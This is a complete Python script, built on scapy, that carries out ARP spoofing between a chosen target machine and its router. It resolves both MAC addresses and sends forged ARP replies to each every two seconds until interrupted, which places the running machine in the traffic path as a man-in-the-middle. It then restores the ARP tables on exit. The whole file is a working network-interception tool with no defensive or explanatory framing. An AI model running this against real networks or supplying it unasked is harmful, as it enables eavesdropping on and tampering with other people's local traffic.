import scapy.all as scapy
import time
import argparse
import subprocess

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest= "target_ip", help= "-t or --target for Target's IP")
    parser.add_argument("-r", "--router", dest= "router_ip", help="-r or --router for Router's IP")
    args = parser.parse_args()

    if not args.target_ip:
        print("[-] Please provide with Target IP. Use -h or --help for info")
        exit()
    if not args.router_ip:
        print("[-] Please provide with Router IP. Use -h or --help for info")
        exit()

    return args

def get_mac(ip):
    arp_rqst_packet = scapy.ARP(pdst= ip)
    broadcast_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_rqst_packet
    answered_packets_list = scapy.srp(arp_broadcast_packet, verbose = False, timeout = 1)[0]
    mac_add = answered_packets_list[0][1].hwsrc
    return mac_add



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst= target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore_arp_tables(target_ip, real_ip):
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    packet = scapy.ARP(op = 2 , pdst= target_ip, hwdst = target_mac, psrc= real_ip, hwsrc= real_mac)
    scapy.send(packet, count= 2, verbose= False)



args = get_args()
sent_packets = 0

try:
    while True:
        spoof(args.target_ip,args.router_ip)
        spoof(args.router_ip, args.target_ip)
        sent_packets += 2
        print("\r[+] Numbers of Packets Sent: " + str(sent_packets), end= "")
        time.sleep(2)
    
except KeyboardInterrupt:
    print("\n[+] Keyboard Interrupt you pressed CTRL + C\n[+] Restoring ARP Tables")
    restore_arp_tables(args.target_ip, args.router_ip)
    restore_arp_tables(args.router_ip, args.target_ip)

